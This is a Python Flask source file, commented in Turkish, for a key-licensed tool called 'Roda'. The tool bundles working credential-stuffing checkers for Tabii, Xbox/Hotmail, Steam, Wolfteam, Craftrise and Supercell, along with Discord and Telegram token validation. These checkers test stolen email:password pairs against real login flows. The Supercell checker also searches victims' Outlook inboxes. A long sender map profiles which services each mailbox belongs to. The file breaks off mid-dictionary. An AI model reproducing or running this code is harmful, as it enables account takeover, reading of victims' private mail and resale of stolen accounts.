#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roda - TÜM CHECKER'LAR TEK YERDE
Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
Xbox, Steam, Supercell, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen, Roda Inbox, Site Kopyala, Temp Mail, Email Spammer
"""

import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3, uuid
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, parse_qs, quote, urlencode
import requests
from flask import Flask, request, jsonify, Response, send_file
from bs4 import BeautifulSoup
from user_agent import generate_user_agent

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_v1_5
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️ Crypto kütüphanesi yok! pip install pycryptodome")

app = Flask(__name__)
app.secret_key = os.urandom(24)
urllib3.disable_warnings()

# ============================================================
# MASTER KEY (ENV'DEN AL, KODDA YOK)
# ============================================================
MASTER_KEY = os.environ.get("RODA_MASTER_KEY", "Roda@2026#Secure!X7")
if MASTER_KEY == "Roda@2026#Secure!X7":
    print("⚠️ UYARI: Varsayılan master key kullanılıyor! RODA_MASTER_KEY ortam değişkenini ayarlayın.")

KEYS_FILE = "keys.json"

# ============================================================
# LOG SİSTEMİ
# ============================================================
LOGS = []
MAX_LOGS = 1000

def add_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LOGS.append({"timestamp": timestamp, "level": level, "message": message})
    if len(LOGS) > MAX_LOGS:
        LOGS.pop(0)
    print(f"[{timestamp}] [{level}] {message}")

# ============================================================
# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
# ============================================================
def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def is_key_valid(key):
    if key == MASTER_KEY:
        return True, "Admin", None
    keys = load_keys()
    if key not in keys:
        return False, None, None
    entry = keys[key]
    client_ip = get_client_ip()
    exp = entry.get("expires")
    if exp:
        if datetime.now() >= datetime.fromisoformat(exp):
            del keys[key]
            save_keys(keys)
            add_log(f"Key süresi doldu: {key}", "WARNING")
            return False, None, None
    bound_ip = entry.get("bound_ip")
    if bound_ip and bound_ip != client_ip:
        add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
        return False, None, None
    if entry.get("used", False):
        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
        return False, None, None
    return True, entry.get("note", "Kullanıcı"), entry

def mark_key_used(key):
    keys = load_keys()
    if key in keys:
        keys[key]["used"] = True
        keys[key]["used_at"] = datetime.now().isoformat()
        save_keys(keys)

def is_admin(key):
    valid, role, _ = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR (TÜM CHECKER'LAR)
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok Gen", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox & MC", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Wolfteam", "domain": "joygame.com", "icon": "fa-solid fa-skull"},
    {"name": "Craftrise", "domain": "craftrise.com.tr", "icon": "fa-solid fa-hammer"},
    {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
    {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
    {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
    {"name": "Supercell", "domain": "supercell.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Roda Inbox", "domain": "outlook.com", "icon": "fa-solid fa-inbox"},
]

# ============================================================
# TÜM CHECKER FONKSİYONLARI
# ============================================================

# ---- TABII ----
TABII_BASE = "https://eu1.tabii.com/apigateway"

def check_tabii_account(email, password, proxy=None):
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://www.tabii.com",
        "Referer": "https://www.tabii.com/"
    })
    if proxies:
        session.proxies.update(proxies)
    session.verify = False
    result = {"status": "ERROR", "details": {"full_name": "?", "subscription": "?", "premium": False, "expire": "?", "profiles_count": 0}, "message": ""}
    try:
        r = session.post(f"{TABII_BASE}/auth/v2/login", json={"email": email, "password": password}, timeout=15)
        if r.status_code != 200:
            result["status"] = "BAD"
            result["message"] = f"HTTP {r.status_code}"
            return result
        data = r.json()
        token = data.get("accessToken")
        if not token:
            result["status"] = "BAD"
            result["message"] = "Token missing"
            return result
        headers = {"Authorization": f"Bearer {token}"}
        r = session.get(f"{TABII_BASE}/auth/v2/me", headers=headers, timeout=10)
        if r.status_code != 200:
            result["status"] = "HIT"
            result["message"] = "Giriş başarılı (detaylar alınamadı)"
            return result
        user = r.json()
        name = user.get("name", "Unknown")
        surname = user.get("surname", "")
        full_name = f"{name} {surname}".strip()
        sub = user.get("subscription", {})
        subscription = sub.get("title", sub.get("name", "Free"))
        premium = subscription.lower() == "premium"
        expire = sub.get("expireDate", "")[:10] if sub.get("expireDate") else "N/A"
        r = session.get(f"{TABII_BASE}/profiles/v2/", headers=headers, timeout=10)
        profiles_count = 0
        if r.status_code == 200:
            prof_data = r.json()
            if isinstance(prof_data, list):
                profiles_count = len(prof_data)
        result["status"] = "HIT"
        result["message"] = "Giriş başarılı"
        result["details"]["full_name"] = full_name
        result["details"]["subscription"] = subscription
        result["details"]["premium"] = premium
        result["details"]["expire"] = expire
        result["details"]["profiles_count"] = profiles_count
        add_log(f"Tabii HIT: {email} | {full_name} | {subscription}", "SUCCESS")
    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = str(e)[:60]
    finally:
        session.close()
    return result

# ---- XBOX (GERÇEK) ----
def check_xbox_account(email, password):
    session = requests.Session()
    session.verify = False
    try:
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#' in login_req.url:
            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
            if ms_token != "None":
                try:
                    xbox_token, uhs = get_xbox_token(session, ms_token)
                    if xbox_token and uhs:
                        xsts = get_xsts_token(session, xbox_token)
                        if xsts:
                            profile = get_xbox_profile(session, uhs, xsts)
                            gamertag = profile.get("gamertag", "N/A")
                            tier = profile.get("tier", "N/A")
                            return {"status": "HIT", "message": f"Xbox/MC | Gamertag: {gamertag} | Tier: {tier}", "details": {"gamertag": gamertag, "tier": tier}}
                except:
                    pass
                return {"status": "HIT", "message": f"Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
        return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

def get_xbox_token(session, ms_token):
    try:
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except:
        pass
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
        if resp.status_code == 200:
            return resp.json().get('Token')
    except:
        pass
    return None

def get_xbox_profile(session, uhs, xsts_token):
    try:
        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        resp = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
    except:
        pass
    return {"gamertag": "N/A", "tier": "N/A"}

# ---- WOLFTEAM ----
def check_wolfteam_account(email, password):
    try:
        session = requests.Session()
        login_url = f"https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={quote(email)}&TopbarLoginPassword={quote(password)}&TopbarLoginRemember=true&FormId=tb-login-form&siteLang=tr"
        headers = {"User-Agent": generate_user_agent()}
        r = session.get(login_url, headers=headers, timeout=10)
        if '"IsSucceeded":true' in r.text:
            jp = re.search(r',"JpBalance":([^,}]+)', r.text)
            jp_val = jp.group(1).strip('"') if jp else "0"
            return {"status": "HIT", "message": f"JP: {jp_val}", "details": {"jp": jp_val}}
        elif '"IsSucceeded":false' in r.text:
            return {"status": "BAD", "message": "Hatalı giriş"}
        else:
            return {"status": "CUSTOM", "message": "Bilinmeyen hata"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- CRAFTRISE ----
def check_craftrise_account(email, password):
    try:
        session = requests.Session()
        login_url = "https://www.craftrise.com.tr/posts/post-login.php"
        headers = {"User-Agent": generate_user_agent(), "X-Requested-With": "XMLHttpRequest"}
        data = {"value": email, "password": password, "grecaptcharesponse": "dummy"}
        r = session.post(login_url, headers=headers, data=data, timeout=10)
        res = r.json()
        if res.get("resultType") == "success" or "başarıyla" in res.get("resultMessage", "").lower():
            rc_page = session.get("https://www.craftrise.com.tr/shop", headers=headers, timeout=5)
            soup = BeautifulSoup(rc_page.text, "html.parser")
            rc = soup.find('span', class_='rcCount')
            rc_val = rc.text.strip() if rc else "0"
            return {"status": "HIT", "message": f"RC: {rc_val}", "details": {"rc": rc_val}}
        else:
            return {"status": "BAD", "message": "Hatalı giriş"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- HOTMAIL ----
def check_hotmail_account(email, password):
    try:
        session = requests.Session()
        session.verify = False
        sftag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        resp = session.get(sftag_url, timeout=10)
        sftag_match = re.search(r'value=\\\"(.+?)\\\"', resp.text) or re.search(r'value="(.+?)"', resp.text)
        url_match = re.search(r'"urlPost":"(.+?)"', resp.text) or re.search(r"urlPost:'(.+?)'", resp.text)
        if not sftag_match or not url_match:
            return {"status": "CUSTOM", "message": "Token alınamadı"}
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag_match.group(1)}
        login_req = session.post(url_match.group(1), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if 'cancel?mkt=' in login_req.text or 'recover?mkt' in login_req.text:
            return {"status": "2FA", "message": "2FA gerekli"}
        if "incorrect" in login_req.text.lower() or "doesn't exist" in login_req.text.lower():
            return {"status": "BAD", "message": "Hatalı giriş"}
        if '#access_token=' in login_req.url:
            return {"status": "HIT", "message": "Hotmail giriş başarılı"}
        return {"status": "CUSTOM", "message": "Bilinmeyen durum"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- TOKEN CHECK ----
def check_token(token_type, token):
    if token_type == "discord":
        headers = {"Authorization": token}
        is_bot = False
        try:
            res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
            if res.status_code != 200:
                headers = {"Authorization": f"Bot {token}"}
                res = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=5)
                is_bot = True
            if res.status_code == 200:
                data = res.json()
                user_type = "Bot" if is_bot else "User"
                username = f"{data.get('username')}#{data.get('discriminator', '0000')}"
                email = data.get('email', 'Yok')
                nitro = "Var" if data.get('premium_type', 0) > 0 else "Yok"
                mfa = "Aktif" if data.get('mfa_enabled') else "Pasif"
                return {"status": "HIT", "message": f"{user_type} | {username} | Nitro:{nitro} | 2FA:{mfa}", "details": {"email": email}}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    elif token_type == "telegram":
        try:
            res = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
            if res.status_code == 200 and res.json().get("ok"):
                data = res.json().get('result', {})
                return {"status": "HIT", "message": f"Bot: @{data.get('username')} (ID: {data.get('id')})"}
            else:
                return {"status": "BAD", "message": "Geçersiz token"}
        except Exception as e:
            return {"status": "ERROR", "message": str(e)[:60]}
    return {"status": "ERROR", "message": "Bilinmeyen token tipi"}

# ---- TIKTOK GEN ----
def check_tiktok_username(username):
    try:
        headers = {"User-Agent": generate_user_agent()}
        r = requests.head(f"https://www.tiktok.com/@{username}", headers=headers, timeout=5)
        if r.status_code == 404:
            return {"status": "HIT", "message": f"@{username} kullanılabilir"}
        elif r.status_code == 200:
            return {"status": "BAD", "message": f"@{username} alınmış"}
        else:
            return {"status": "CUSTOM", "message": f"Limit/Ban"}
    except:
        return {"status": "ERROR", "message": "Bağlantı hatası"}

# ---- STEAM ----
def check_steam_account(username, password, proxy_url=None):
    if not CRYPTO_AVAILABLE:
        return {"status": "ERROR", "message": "Crypto kütüphanesi yok! pip install pycryptodome"}

    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    try:
        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": username}, timeout=10).json()
        rsa_data = rsa_resp.get("response", {})
        if not rsa_data.get("publickey_mod"):
            return {"status": "BAD", "message": "RSA anahtarı alınamadı"}

        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()

        resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
            data={"account_name": username, "encrypted_password": enc_pwd, "encryption_timestamp": rsa_data["timestamp"],
                  "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=10).json().get("response", {})

        steamid = resp.get("steamid")
        if not steamid:
            return {"status": "BAD", "message": "SteamID alınamadı"}

        guard_types = [c.get("confirmation_type", 0) for c in resp.get("allowed_confirmations", [])]
        if any(t in (3, 4) for t in guard_types):
            return {"status": "2FA", "message": "Steam Guard gerekli"}

        time.sleep(0.5)
        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
            data={"client_id": resp["client_id"], "request_id": resp["request_id"]}, timeout=10).json().get("response", {})

        access, refresh = poll.get("access_token"), poll.get("refresh_token")
        if not access or not refresh:
            return {"status": "BAD", "message": "Token alınamadı"}

        session.get("https://store.steampowered.com/", timeout=8)
        sid = session.cookies.get("sessionid", "")
        try:
            fin = session.post("https://login.steampowered.com/jwt/finalizelogin", data={"nonce": refresh, "sessionid": sid, "redir": "https://steamcommunity.com/login/home/?goto="}, timeout=8)
            for t in fin.json().get("transfer_info", []):
                if t.get("url"):
                    session.post(t["url"], data=t.get("params", {}), timeout=8)
        except:
            pass

        if "steamLoginSecure" not in [c.name for c in session.cookies]:
            for d in [".steamcommunity.com", ".steampowered.com"]:
                session.cookies.set("steamLoginSecure", f"{steamid}||{access}", domain=d)

        level = "?"
        try:
            r = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access, "steamid": steamid}, timeout=8)
            if r.status_code == 200 and r.json().get("response"):
                level = str(r.json()["response"].get("player_level", "?"))
        except:
            pass

        balance = "—"
        try:
            r = session.get("https://store.steampowered.com/account/", timeout=8)
            if r.status_code == 200:
                m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r.text)
                if m:
                    balance = m.group(1).strip()
        except:
            pass

        vac_banned = False
        vac_count = 0
        vac_days = 0
        try:
            r = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access, "steamids": steamid}, timeout=8)
            if r.status_code == 200 and r.json().get("players"):
                p = r.json()["players"][0]
                vac_banned = bool(p.get("VACBanned", False))
                vac_count = int(p.get("NumberOfVACBans", 0))
                vac_days = int(p.get("DaysSinceLastBan", 0))
        except:
            pass
        vac_str = f"🔴VAC({vac_count}ban,{vac_days}g önce)" if vac_banned else "🟢Temiz"

        return {
            "status": "HIT",
            "message": f"Steam giriş başarılı",
            "details": {
                "level": level,
                "balance": balance,
                "vac": vac_str,
                "steamid": steamid
            }
        }

    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- SUPERCELL ----
def check_supercell_account(email, password, proxy_url=None):
    session = requests.Session()
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
    redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
    base_info = f"{email}:{password}"

    try:
        url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id={client_id}&mkt=en&response_type=code&redirect_uri={quote(redirect_uri)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        headers = {"User-Agent": ua}

        r1 = session.get(url_auth, headers=headers, allow_redirects=False, timeout=15)
        if r1.status_code != 302:
            return {"status": "ERROR", "message": f"Ağ Hatası (R1)"}

        next_url = r1.headers.get('Location', '')
        r2 = session.get(next_url, headers=headers, allow_redirects=False, timeout=15)

        ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"', r2.text) or re.search(r'name="PPFT".*?value="([^"]*)"', r2.text)
        ppft = ppft_match.group(1) if ppft_match else None
        url_post = re.search(r'"urlPost":"(.*?)"', r2.text) or re.search(r"urlPost:'(.*?)'", r2.text)
        url_post = url_post.group(1) if url_post else None

        if not ppft or not url_post:
            return {"status": "ERROR", "message": "PPFT veya URL alınamadı"}

        data_login = {
            "i13": "1", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
            "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
        }
        headers_post = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua}
        r3 = session.post(url_post, data=data_login, headers=headers_post, allow_redirects=False, timeout=15)

        if "incorrect" in r3.text.lower() or "password" in r3.text.lower() and "error" in r3.text.lower():
            return {"status": "BAD", "message": "Yanlış şifre"}

        oauth_url = ""
        if r3.status_code == 302 and "Location" in r3.headers:
            oauth_url = r3.headers['Location']
        else:
            uaid = re.search(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"', r3.text) or re.search(r'name="uaid" id="uaid" value="(.*?)"', r3.text)
            uaid = uaid.group(1) if uaid else None
            opid = re.search(r'opid%3d(.*?)%26', r3.text)
            opid = opid.group(1) if opid else None
            opidt = re.search(r'opidt%3d(.*?)&', r3.text)
            opidt = opidt.group(1) if opidt else None

            if uaid and opid:
                oauth_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id={client_id}&opid={opid}&mkt=EN-US&opidt={opidt}&res=success&route=C105_BAY"
            else:
                return {"status": "2FA", "message": "Doğrulama istiyor"}

        code = None
        if oauth_url.startswith("msauth://"):
            code = re.search(r'code=(.*?)&', oauth_url)
            code = code.group(1) if code else None
        else:
            r4 = session.get(oauth_url, allow_redirects=False, timeout=15)
            loc = r4.headers.get('Location', '')
            code = re.search(r'code=(.*?)&', loc)
            code = code.group(1) if code else None

        if not code:
            return {"status": "2FA", "message": "Code alınamadı (2FA olabilir)"}

        data_token = {
            "client_info": "1", "client_id": client_id, "redirect_uri": redirect_uri,
            "grant_type": "authorization_code", "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        r5 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data_token, timeout=15)

        if r5.status_code == 200:
            token = r5.json().get('access_token')
            cid = session.cookies.get("MSPCID", domain=".login.live.com") or "0000000000000000"

            url_search = "https://outlook.live.com/search/api/v2/query?n=124"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Query": {"QueryString": "Supercell ID"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers_search = {
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Content-Type": "application/json",
                "User-Agent": "Outlook-Android/2.0"
            }

            r_search = session.post(url_search, json=payload, headers=headers_search, timeout=15)
            if r_search.status_code == 200:
                data = r_search.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except:
                    results = []

                total_found = len(results)
                games = {
                    "Clash Royale": "❌",
                    "Brawl Stars": "❌",
                    "Clash Of Clans": "❌",
                    "Hay Day": "❌"
                }

                if total_found > 0:
                    for item in results:
                        source = item.get('Source', {})
                        content = ((source.get('Subject') or "") + " " + (source.get('Preview') or "")).lower()
                        if "clash royale" in content:
                            games["Clash Royale"] = "✔️"
                        if "brawl stars" in content:
                            games["Brawl Stars"] = "✔️"
                        if "clash of clans" in content:
                            games["Clash Of Clans"] = "✔️"
                        if "hay day" in content:
                            games["Hay Day"] = "✔️"

                    return {
                        "status": "HIT",
                        "message": f"Supercell bağlantıları bulundu",
                        "details": {
                            "email": email,
                            "games": games,
                            "total_found": total_found
                        }
                    }
                else:
                    return {
                        "status": "FREE",
                        "message": "Supercell maili bulunamadı",
                        "details": {
                            "email": email,
                            "games": games,
                            "total_found": 0
                        }
                    }
            else:
                return {"status": "ERROR", "message": "Arama API hatası"}
        else:
            return {"status": "ERROR", "message": "Token hatası"}

    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:60]}

# ---- RODA INBOX (580+ SERVİS) ----
RODA_SERVICES = {
    'security@facebookmail.com': 'Facebook',
    'security@mail.instagram.com': 'Instagram',
    'register@account.tiktok.com': 'TikTok',
    'info@x.com': 'Twitter',
    'security-noreply@linkedin.com': 'LinkedIn',
    'noreply@discord.com': 'Discord',
    'email@discord.com': 'Discord',
    'noreply@telegram.org': 'Telegram',
    'no-reply@whatsapp.com': 'WhatsApp',
    'noreply@steampowered.com': 'Steam',
    'xboxreps@engage.xbox.com': 'Xbox',
    'noreply@xbox.com': 'Xbox',
    'reply@txn-email.playstation.com': 'PlayStation',
    'help@acct.epicgames.com': 'EpicGames',
    'no-reply@epicgames.com': 'Epic',
    'noreply@rockstargames.com': 'Rockstar',
    'EA@e.ea.com': 'EA Sports',
    'noreply@ubisoft.com': 'Ubisoft',
    'noreply@blizzard.com': 'Blizzard',
    'no-reply@riotgames.com': 'Riot Games',
    'noreply@valorant.com': 'Valorant',
    'noreply@hoyoverse.com': 'Genshin Impact',
    'noreply@pubgmobile.com': 'PUBG',
    'accounts@roblox.com': 'Roblox',
    'noreply@mojang.com': 'Minecraft',
    'noreply@id.supercell.com': 'Supercell',
    'no-reply@accounts.nintendo.com': 'Nintendo',
    'noreply@valvesoftware.com': 'Valve/CSGO/Dota2',
    'noreply@activision.com': 'Activision',
    'noreply@bethesda.net': 'Bethesda',
    'noreply@2k.com': '2K Games',
    'no-reply@warframe.com': 'Warframe',
    'info@account.netflix.com': 'Netflix',
    'no-reply@spotify.com': 'Spotify',
    'no-reply@twitch.tv': 'Twitch',
    'no-reply@youtube.com': 'YouTube',
    'no-reply@disneyplus.com': 'Disney+',
    'account@hulu.com': 'Hulu',
    'no-reply@hbomax.com': 'HBO Max',
    'auto-confirm@amazon.com': 'Amazon Prime',
    'no-reply@apple.com': 'Apple TV+',
    'noreply@crunchyroll.com': 'Crunchyroll',
    'info@Tabii.com': 'Tabii',
    'account-update@amazon.com': 'Amazon',
    'newuser@nuwelcome.ebay.com': 'eBay',
    'no-reply@shopify.com': 'Shopify',
    'transaction@etsy.com': 'Etsy',
    'no-reply@aliexpress.com': 'AliExpress',
    'no-reply@walmart.com': 'Walmart',
    'noreply@trendyol.com': 'Trendyol',
    'noreply@hepsiburada.com': 'Hepsiburada',
    'service@paypal.com.br': 'PayPal',
    'do-not-reply@ses.binance.com': 'Binance',
    'no-reply@coinbase.com': 'Coinbase',
    'no-reply@kraken.com': 'Kraken',
    'noreply@okx.com': 'OKX',
    'no-reply@bybit.com': 'Bybit',
    'no-reply@revolut.com': 'Revolut',
    'noreply@kucoin.com': 'KuCoin',
    'no-reply@ubereats.com': 'Uber Eats',
    'no-reply@doordash.com': 'DoorDash',
    'no-reply@yemeksepeti.com': 'Yemek Sepeti',
    'noreply@getir.com': 'Getir',
    'noreply@banabi.com': 'Banabi',
    'noreply@foodpanda.com': 'Foodpanda',
    'no-reply@uber.com': 'Uber',
    'no-reply@lyft.com': 'Lyft',
    'no-reply@airbnb.com': 'Airbnb',
    'no-reply@booking.com': 'Booking.com',
    'noreply@expedia.com': 'Expedia',
    'noreply@agoda.com': 'Agoda',
    'noreply@trivago.com': 'Trivago',
    'noreply@skyscanner.com': 'Skyscanner',
    'no-reply@accounts.google.com': 'Google',
    'noreply@github.com': 'GitHub',
    'no-reply@dropbox.com': 'Dropbox',
    'no-reply@zoom.us': 'Zoom',
    'no-reply@slack.com': 'Slack',
    'no-reply@notion.so': 'Notion',
    'no-reply@wordpress.com': 'WordPress',
    'no-reply@adobe.com': 'Adobe',
    'no-reply@canva.com': 'Canva',
    'noreply@figma.com': 'Figma',
    'noreply@atlassian.com': 'Atlassian',
    'noreply@replit.com': 'Replit',
    'noreply@netlify.com': 'Netlify',
    'noreply@vercel.com': 'Vercel',
    'noreply@heroku.com': 'Heroku',
    'noreply@digitalocean.com': 'DigitalOcean',
    'noreply@aws.amazon.com': 'AWS',
    'noreply@azure.com': 'Azure',
    'noreply@cloudflare.com': 'Cloudflare',
    'noreply@gitlab.com': 'GitLab',
    'noreply@stackoverflow.com': 'Stack Overflow',
    'noreply@medium.com': 'Medium',
    'noreply@substack.com': 'Substack',
    'noreply@quora.com': 'Quora',
    'noreply@hubspot.com': 'HubSpot',
    'noreply@salesforce.com': 'Salesforce',
    'noreply@zendesk.com': 'Zendesk',
    'noreply@intercom.com': 'Intercom',
    'noreply@stripe.com': 'Stripe',
    'noreply@square.com': 'Square',
    'noreply@wix.com': 'Wix',
    'noreply@squarespace.com': 'Squarespace',
    'no-reply@nordvpn.com': 'NordVPN',
    'no-reply@expressvpn.com': 'ExpressVPN',
    'no-reply@surfshark.com': 'Surfshark',
    'no-reply@protonmail.com': 'ProtonMail',
    'no-reply@bitwarden.com': 'Bitwarden',
